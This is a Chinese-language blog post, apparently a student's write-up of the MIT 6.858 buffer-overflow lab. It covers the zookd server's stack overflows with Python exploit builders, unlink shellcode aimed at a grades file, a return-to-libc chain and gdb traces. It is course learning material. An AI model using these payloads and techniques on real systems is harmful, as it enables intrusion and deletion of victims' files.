@@ -1,0 +1,482 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Computer Security - Buffer overflows - Sugar&#x27;s Blog</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/toc.css">
+        <!-- MathJax -->
+        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="about.html">About</a></li><li class="chapter-item expanded affix "><li class="part-title">2023</li><li class="chapter-item expanded "><a href="blog20230222.html">CS 161 REGULUS</a></li><li class="chapter-item expanded "><a href="blog20230406.html">MIT 6.858 Lab3: Symbolic execution</a></li><li class="chapter-item expanded "><a href="blog20230110.html" class="active">Computer Security - Buffer overflows</a></li><li class="chapter-item expanded "><div>MIT 6.007 Signals And Systems</div></li><li class="chapter-item expanded affix "><li class="part-title">2022</li><li class="chapter-item expanded "><a href="blog20221209.html">来点utterances</a></li><li class="chapter-item expanded "><a href="blog20221129.html">红黑树</a></li><li class="chapter-item expanded "><a href="blog20221113.html">B+Tree</a></li><li class="chapter-item expanded "><a href="blog20221105.html">CMU 15-445/645</a></li><li class="chapter-item expanded "><a href="blog20221028.html">构建mdbook的博客</a></li><li class="spacer"></li><li class="chapter-item expanded "><a href="blog20220726.html">MIT 6.824 kvraft</a></li><li class="chapter-item expanded "><a href="blog20220630.html">MIT 6.S081 mmap</a></li><li class="chapter-item expanded "><a href="blog20220519.html">frp内网穿透实践</a></li><li class="chapter-item expanded "><a href="blog20220517.html">画饼</a></li><li class="chapter-item expanded "><a href="blog20220507.html">母亲节快乐</a></li><li class="chapter-item expanded "><a href="blog20220430.html">MIT 6.S081 File System</a></li><li class="chapter-item expanded "><a href="blog20220424.html">MIT 6.S081 Locks</a></li><li class="chapter-item expanded "><a href="blog20220422.html">Docker实践</a></li><li class="chapter-item expanded "><a href="blog20220224.html">MIT 6.S081 Network Driver</a></li><li class="chapter-item expanded affix "><li class="part-title">2021</li><li class="chapter-item expanded "><a href="blog20211231.html">Slurm单机部署</a></li><li class="chapter-item expanded "><a href="blog20211119.html">MIT 6.S081 COW</a></li><li class="chapter-item expanded "><a href="blog20211024.html">MIT 6.S081 Traps</a></li><li class="chapter-item expanded "><a href="blog20211017.html">MIT 6.S081 Page Tables</a></li><li class="chapter-item expanded "><a href="blog20211012.html">MIT 6.828 System calls</a></li><li class="chapter-item expanded "><a href="blog20210926.html">MIT 6.828 Util Lab</a></li><li class="chapter-item expanded "><a href="blog20210805.html">可靠数据传输协议</a></li><li class="chapter-item expanded "><a href="blog20210715.html">CSAPP - Proxy Lab</a></li><li class="chapter-item expanded "><a href="blog20210512.html">Raft</a></li><li class="chapter-item expanded "><a href="blog20210503.html">CSAPP - Malloc Lab</a></li><li class="chapter-item expanded "><a href="blog20210419.html">CSAPP - Shell Lab</a></li><li class="chapter-item expanded "><a href="blog20210323.html">CSAPP - Cache Lab</a></li><li class="chapter-item expanded "><a href="blog20210308.html">CSAPP - Arch Lab</a></li><li class="chapter-item expanded "><a href="blog20210219.html">CSAPP - Attack Lab</a></li><li class="chapter-item expanded "><a href="blog20210206.html">CSAPP - Bomb Lab</a></li><li class="chapter-item expanded "><a href="blog20210203.html">CSAPP - Data Lab</a></li><li class="chapter-item expanded affix "><li class="part-title">2020</li><li class="chapter-item expanded "><a href="blog20201011.html">MIT 6.824 MapReduce</a></li><li class="chapter-item expanded "><a href="blog20200201.html">MagicCube</a></li><li class="chapter-item expanded "><a href="blog20200116.html">bluelog</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Sugar&#x27;s Blog</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/Sugar-Coder/Sugar-Coder.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <div class="sidetoc"><nav class="pagetoc"></nav></div>
+                    <main>
+                        <h1 id="computer-security---buffer-overflows"><a class="header" href="#computer-security---buffer-overflows">Computer Security - Buffer overflows</a></h1>
+<p><a href="http://css.csail.mit.edu/6.858/2022/">MIT6.858</a> -- Computer Systems Security 课程</p>
+<h2 id="lab-setup"><a class="header" href="#lab-setup">Lab Setup</a></h2>
+<p>Enviroments: Mac laptops with the ARM M2 processor</p>
+<p>下载<a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">VM镜像</a>
+安装qemu（x86模拟器）</p>
+<pre><code class="language-sh">brew install qemu
+</code></pre>
+<p>删除<code>6.858-x86_64-v22.sh</code>中的<code>-enable-kvm</code> flag。注意，<strong>不要将这一行注释掉</strong>，而是直接删除，否则bash脚本就断开了，详见<a href="https://stackoverflow.com/a/75082505/13857033">stacks overflow</a></p>
+<p>启动镜像之后就可以用ssh连接了</p>
+<pre><code class="language-sh">ssh -p 2222 student@localhost
+</code></pre>
+<p>当时课程网站的git仓库clone不了，就在<a href="https://github.com/f8nque/mit6858.git">github</a>上找了一个<a href="https://css.csail.mit.edu/6.858/2020/">2020</a>年的实验。</p>
+<p>在<code>~/.ssh/config</code>加一行alias，方便ssh连接。推荐使用vscode的插件 Remote Explorer 来连接开发环境</p>
+<pre><code class="language-txt">Host 858vm
+  User student
+  HostName localhost
+  Port 2222
+</code></pre>
+<h2 id="lab1-buffer-overflows"><a class="header" href="#lab1-buffer-overflows">Lab1 Buffer overflows</a></h2>
+<h3 id="part-1-exercise1"><a class="header" href="#part-1-exercise1">Part 1: Exercise1</a></h3>
+<p>首先要找到zookd服务器的vulnerability，我找了如下几个，但是还有更多。</p>
+<ol>
+<li>
+<p>zookd.c -&gt; http.c:105
+process_client 中有 reqpath是分配在栈上，process_client -&gt; http_request_line -&gt; url_decode
+调用http.c中的url_decode作为dst参数传入，但是http_request_line中的buf设置的大小是8192，比reqpath（4096）大，
+如果request line的请求url过长，那么就会覆盖reqpath所在的栈上内容，造成buffer overflow</p>
+</li>
+<li>
+<p>http.c:286
+经过decode后的URI传给 http_serve, 如果URI(参数name）全是 '\0', 那么strlen测量的字符串长度就一直是0.
+strncat将name接到pn的末尾后就会覆盖栈上的内容(char pn[2048])
+因此这个错误应该会比上面的那个错误先被触发（http_serve返回时）
+不容易触发，有防护</p>
+</li>
+<li>
+<p>http.c:23
+touch函数接受的参数如果过长，会造成栈溢出</p>
+</li>
+<li>
+<p>http.c:159
+在处理http_request_header时，value是在栈上分配的(char value[512])，请求体的参数值被url_decode到value后，没有检测长度
+基于这个构造请求体：</p>
+</li>
+</ol>
+<pre><code>injectValue = b&quot;a&quot; * 600
+req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
+        b&quot;Exploid: &quot; + injectValue + \
+        b&quot;\r\n&quot;
+</code></pre>
+<h3 id="exercise2"><a class="header" href="#exercise2">Exercise2</a></h3>
+<p>再使用buffer overflow的技术导致服务器崩溃（暂时不需要注入shellcode）。主要原理就是覆盖栈上保存的返回地址，让程序返回到无效的地址。
+使用上面找到的第4个vulnerability来构造攻击，主要是溢出 <code>http.c:http_request_header</code>中的value。</p>
+<pre><code class="language-python">def build_exploit():
+    injectValue = b&quot;a&quot; * 600
+    req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
+            b&quot;Exploid: &quot; + injectValue + \
+            b&quot;\r\n&quot;
+    return req
+</code></pre>
+<h3 id="part-2-code-injection"><a class="header" href="#part-2-code-injection">Part 2: Code Injection</a></h3>
+<p>zookd这个http server的栈是可执行的，所以可以往栈上注入代码，通过覆盖了当前函数的返回值，跳到栈中injected code的起始位置，可以执行攻击者的代码。</p>
+<p><strong>exercise 3</strong>
+修改Shellcode.S来完成 unlink 系统调用的运行，完成unlink <code>/home/student/grades.txt</code>。</p>
+<pre><code class="language-asm">#include &lt;sys/syscall.h&gt;
+
+#define STRING  &quot;/home/student/grades.txt&quot;
+#define STRLEN  24
+#define ARGV    (STRLEN+1)
+
+.globl main
+  .type main, @function
+
+ main:
+  jmp calladdr
+
+ popladdr:
+  popq  %rcx       /* get the STRING address */
+  movq  %rcx,(ARGV)(%rcx) /* set up argv pointer to pathname */
+  xorq  %rax,%rax   /* get a 64-bit zero value */
+  movb  %al,(STRLEN)(%rcx)  /* null-terminate our string */
+
+  movb  $SYS_unlink,%al   /* set up the syscall number */
+  movq  %rcx,%rdi   /* syscall arg 1: string pathname */
+  syscall       /* invoke syscall */
+
+  xorq  %rax,%rax   /* get a 64-bit zero value */
+  movb    $SYS_exit,%al   /* set up the syscall number */
+  xorq  %rdi,%rdi   /* syscall arg 1: 0 */
+  syscall       /* invoke syscall */
+
+ calladdr:
+  call  popladdr
+  .ascii  STRING
+</code></pre>
+<p><strong>exercise 4</strong>
+使用gdb找到 http_request_headers 中value在栈上的位置，这个位置就是注入代码的开始位置。注意：使用gdb时要在目录<code>~/lab</code>下运行，这样gdb才能读取<code>.gdbinit</code>文件，跟随子进程跳转。</p>
+<pre><code>(gdb) print &amp;value[0]
+$1 = 0x7fffffffda50
+(gdb) print &amp;envvar[0]
+$1 = 0x7fffffffd850
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffdc90:
+ rip = 0x555555556f4b in http_request_headers (http.c:124); 
+    saved rip = 0x555555556b29
+ called by frame at 0x7fffffffecc0
+ source language c.
+ Arglist at 0x7fffffffdc80, args: fd=4
+ Locals at 0x7fffffffdc80, Previous frame's sp is 0x7fffffffdc90
+ Saved registers:
+  rbx at 0x7fffffffdc78, rbp at 0x7fffffffdc80, rip at 0x7fffffffdc88
+</code></pre>
+<p>可以看到当前栈帧的保存的rbp、rip所在的栈上的地址。</p>
+<p>完成exploit-2.py</p>
+<pre><code class="language-python">&quot;&quot;&quot;
+  bottom of                                             top of
+  memory                                                memory
+
+          envvar            value          i    sbp        ret
+  &lt;-- [0          512][ 0           512 ][   ][        ][        ] main...
+&quot;&quot;&quot;
+addr_value_buffer = 0x7fffffffda50
+addr_retaddr = 0x7fffffffdc88
+
+def build_exploit(shellcode):
+    ## Things that you might find useful in constructing your exploit:
+    ##
+    ##   urllib.quote(s)
+    ##     returns string s with &quot;special&quot; characters percent-encoded
+    ##   struct.pack(&quot;&lt;Q&quot;, x)
+    ##     returns the 8-byte binary encoding of the 64-bit integer x
+
+    # 将shellcode之后到ret开始地址的中间内容填充满
+    shellcode += b&quot;A&quot; * ((addr_retaddr - addr_value_buffer) - len(shellcode))
+
+    # 覆盖返回地址为value_buffer的起始地址
+    shellcode += struct.pack(&quot;&lt;Q&quot;, addr_value_buffer)
+
+    req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
+            b&quot;Exploid: &quot; + shellcode + \
+            b&quot;\r\n&quot;
+    return req
+
+</code></pre>
+<h3 id="part-3-return-to-libc"><a class="header" href="#part-3-return-to-libc">Part 3: Return to libc</a></h3>
+<p>当zookd的栈被标志为不可执行后，就不能通过注入代码来完成攻击了，只能使用Return-Oriented-Programming的技术，找现有程序汇编代码中的gadget，通过每次覆盖返回地址，不断地跳转，完成断章取义式的攻击。</p>
+<p>这个lab给了一个现有的gadget：accidentally函数。我们可以查看他的汇编：</p>
+<pre><code class="language-asm">(gdb) disas accidentally
+Dump of assembler code for function accidentally:
+   0x000055555540188a &lt;+0&gt;: push   %rbp
+   0x000055555540188b &lt;+1&gt;: mov    %rsp,%rbp
+   0x000055555540188e &lt;+4&gt;: mov    0x10(%rbp),%rdi
+   0x0000555555401892 &lt;+8&gt;: nop
+   0x0000555555401893 &lt;+9&gt;: pop    %rbp
+   0x0000555555401894 &lt;+10&gt;:  ret    
+End of assembler dump.
+</code></pre>
+<p>依旧使用http_request_headers中的value buffer做溢出。画出breakpoint设置在http_request_header位置时的栈，便于理解</p>
+<pre><code class="language-txt">            64bit          0
+            |process_client|
+            +--------------+ 16 byte
+            |    ret addr  |   --&gt; 当前函数的返回地址 （需要被覆盖为accidentally的起始地址）
+            +--------------+ 8
+            |   saved bp   |   --&gt; 保存的ebp
+    ebp -&gt;  +--------------+ 0
+            |      int i   |
+            +--------------+ -8
+            |              |
+            |              |
+            |              |
+            +--------------+ &lt;- value 起始地址
+</code></pre>
+<p>我一开始的想法是把 pathstr:<code>/home/student/grades.txt</code>以及填充的返回地址都放在value buffer中，但是发现由于accidentally使用 <code>mov    0x10(%rbp),%rdi</code>来获取字符串的地址，而这个pathstr加上<code>\0</code>的结尾字符，长度超过了24（0x10 + 8)。不够放其他的返回地址，否则不能对齐。所以只能选择从ret_addr开始进行溢出，value到ret_addr之间都填充为garbage。</p>
+<p>假设完成了栈上的溢出，继续画出调用到accidentally开始时的栈帧：</p>
+<pre><code class="language-txt">            64bit          0
+            |              |
+            +              + 40 byte
+            |  pathstr     |   --&gt; 覆盖为真正存储 pathstr 的位置
+            +--------------+ 32
+            |  pathstr_addr|  --&gt; 0x10(%rbp) 所指向的位置，覆盖为 pathstr 的起始地址 $rbp+32
+            +--------------+ 24 
+            |unlink_addr   |   accidentally的返回地址应该被覆盖为 unlink 函数的起始地址
+            +--------------+ 16
+            | random rbp   |  由于push rbp而形成的  (原来放着覆盖的accidentally的起始地址)
+            +--------------+ 8  &lt;-- rsp ，由于move rsp rbp，此时rbp也指向这里
+</code></pre>
+<p>所以最终在http_request_header中栈帧应该被覆盖为：</p>
+<pre><code class="language-txt">            64bit          0
+            |              |
+            +--------------+ 48 byte
+            |              |  
+            +              + 40
+            |   pathstr    |
+            +--------------+ 32 
+            | pathstr_addr |   
+            +--------------+ 24
+            | unlink_addr  |
+            +--------------+ 16 byte
+            |    ret addr  |   --&gt; 当前函数的返回地址 覆盖为accidentally的起始地址
+            +--------------+ 8  - +
+            |   saved bp   |      |
+    rbp -&gt;  +--------------+ 0    |
+            |      int i   |      |     } -&gt; fill with junk
+            +--------------+ -8   |
+            |              |      |
+            |              |      |
+str_addr -&gt; +--------------+ &lt;- value 起始地址 -512
+</code></pre>
+<p>因此filename所在的位置就是：</p>
+<pre><code>(gdb) print $rbp + 32
+$4 = (void *) 0x7fffffffdca0
+</code></pre>
+<p>注意filename后面也要加\r\n</p>
+<pre><code class="language-python">addr_value_buffer = 0x7fffffffda50
+addr_retaddr = 0x7fffffffdc88
+addr_rbpaddr = 0x7fffffffdc80 # http_request_header中$rbp所指向的位置
+addr_accidentally = 0x55555540188a # 第一次尝试的时候把这个返回地址搞错了
+libc_unlink_addr = 0x1555554011c0
+filename_addr = addr_rbpaddr + 32
+
+# 输入64位int
+def percent_hex_encode(payload: int):
+    r = b&quot;&quot;
+    for c in payload:  # for every char at payload
+        #           转换为单字节       转换为16进制表示的str 编码为bytes
+        r += b&quot;%&quot; + c.to_bytes(1, &quot;little&quot;).hex().encode()
+    return r
+
+def build_exploit():
+    ## Things that you might find useful in constructing your exploit:
+    ##
+    ##   urllib.quote(s)
+    ##     returns string s with &quot;special&quot; characters percent-encoded
+    ##   struct.pack(&quot;&lt;Q&quot;, x)
+    ##     returns the 8-byte binary encoding of the 64-bit integer x
+
+
+    # 将shellcode之后到ret开始地址的中间内容填充满
+    filename = b&quot;/home/student/grades.txt&quot; + b&quot;\0&quot; + b&quot;\r\n&quot;
+
+    # 其他部分填充garbage
+    shellcode = b&quot;A&quot; * (addr_retaddr - addr_value_buffer)
+
+    # 覆盖到栈上的各个地址
+    payload = b&quot;&quot;
+    # 覆盖http_request_header返回地址为accidentally的起始地址
+    payload += struct.pack(&quot;&lt;Q&quot;, addr_accidentally)
+    # 覆盖accidentally的返回地址为unlink的起始地址
+    payload += struct.pack(&quot;&lt;Q&quot;, libc_unlink_addr)
+    # 覆盖为filname的起始地址 $rbp+32 （即对于accidentally栈帧来说 0x10(%rbp) 所指向的位置 ）
+    payload += struct.pack(&quot;&lt;Q&quot;, filename_addr)
+    # 由于我们要攻击url_decode函数，但是url_decode遇到\0字节就会停止读取了，
+    # 所以要把输入的已经转换为64bit的字节序列，转换为%百分号encode的编码
+
+    # 将 \0 编码为 %00
+    shellcode += percent_hex_encode(payload)
+    
+    # 写入filename
+    shellcode += filename
+
+    req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
+            b&quot;Exploid: &quot; + shellcode + \
+            b&quot;\r\n&quot;
+    return req
+</code></pre>
+<p>使用gdb来检查
+在http_request_header设置断点，检查overflow的内容是否已经全部写上去了</p>
+<pre><code class="language-gdb">(gdb) x/g $rbp + 8
+0x7fffffffdc88: 0x0000555555556b8c
+(gdb) x/g $rip
+0x555555401d8c &lt;http_request_headers+365&gt;:  0x4800001499358d48
+(gdb) x/g $rbp + 16
+0x7fffffffdc90: 0x00001555554011c0
+(gdb) print *(char *)($rbp + 32)
+$16 = 47 '/'
+(gdb) print (char *)($rbp + 32)
+$17 = 0x7fffffffdca0 &quot;/home/student/grades.txt&quot;
+(gdb) x/g $rbp + 24
+0x7fffffffdc98: 0x00007fffffffdca0
+(gdb) print $rbp + 32
+$18 = (void *) 0x7fffffffdca0
+</code></pre>
+<h3 id="part-4-fix"><a class="header" href="#part-4-fix">Part 4: fix</a></h3>
+<p>第四部分就是修复之前用到的漏洞，主要就是几个buffer的长度问题，尤其是url_decode时dst的长度的提供。</p>
+<h2 id="知识补充"><a class="header" href="#知识补充">知识补充</a></h2>
+<h3 id="x86"><a class="header" href="#x86">x86</a></h3>
+<p>x86内存布局、寄存器相关、函数调用可以参考<a href="https://textbook.cs161.org/memory-safety/x86.html">cs161</a>课程</p>
+<p><a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a></p>
+<h3 id="gdb"><a class="header" href="#gdb">gdb</a></h3>
+<p><a href="https://visualgdb.com/gdbreference/commands/x">command</a></p>
+<h3 id="shell"><a class="header" href="#shell">shell</a></h3>
+<p>sed的 <code>\1-9</code> 提取匹配的模式。s动作表示替换 <code>s'/oldstr/newstr/g</code></p>
+<pre><code class="language-sh">$ echo QEMU emulator version 7.2.0 | sed 's/QEMU emulator \([a-zA-Z]*\) \([0-9]\)\.\([0-9]\).*/\1.\2.\3/'
+version.7.2
+</code></pre>
+
+                        <div id="comment-container"></div>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="blog20230406.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="blog20221209.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="blog20230406.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="blog20221209.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+        
+        <!-- Custom JS scripts -->
+        <script type="text/javascript" src="theme/comments.js"></script>
+        <script type="text/javascript" src="theme/toc.js"></script>
+    </body>
+</html>
